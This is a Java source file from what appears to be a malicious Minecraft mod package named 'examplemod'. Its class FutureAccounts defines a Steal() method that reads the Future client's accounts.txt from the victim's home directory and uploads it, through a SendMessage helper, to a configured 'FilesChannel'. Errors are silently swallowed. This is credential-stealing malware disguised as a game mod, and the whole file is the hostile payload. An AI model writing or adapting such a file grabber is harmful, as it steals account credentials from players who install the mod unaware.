package com.example.examplemod.Hacks.FilesGrabber.Future;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class FutureAccounts {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getProperty("user.home") + "\\Future\\accounts.txt"));
         SendMessage.doThing("```FutureAccaunts ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol1");
      }

   }
}
